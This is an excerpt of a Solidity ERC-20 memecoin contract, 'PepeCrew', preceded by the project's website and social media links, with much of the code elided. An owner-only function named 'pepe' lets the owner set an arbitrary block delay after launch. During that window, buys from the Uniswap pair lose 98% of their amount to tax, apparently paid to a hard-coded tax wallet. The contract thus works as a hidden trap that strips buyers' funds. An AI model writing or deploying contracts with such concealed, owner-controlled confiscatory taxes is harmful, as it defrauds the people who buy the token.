...
PEPE CREW
https://pepecrew.vip
https://twitter.com/PepeCrewEth
https://t.me/Pepecrewerc
https://medium.com/@pepecreweth
...
contract PEPECREW is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    address payable private _taxWallet = payable(0x1cbb02e8E85727C5f1de721913f333Aaf9d74d4b);
    ...
    string private constant _name = unicode"PepeCrew";
    string private constant _symbol = unicode"PepeCR";
    ...
    function pepe(uint256 number) external onlyOwner {
        blockDelay = number + 1;
    }    
        ...
        if (from != owner() && to != owner()) {
            ...
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                ...
                if (block.number < launchBlock + blockDelay) {
                    taxAmount = amount.mul(98).div(100);                                       
                }
            }
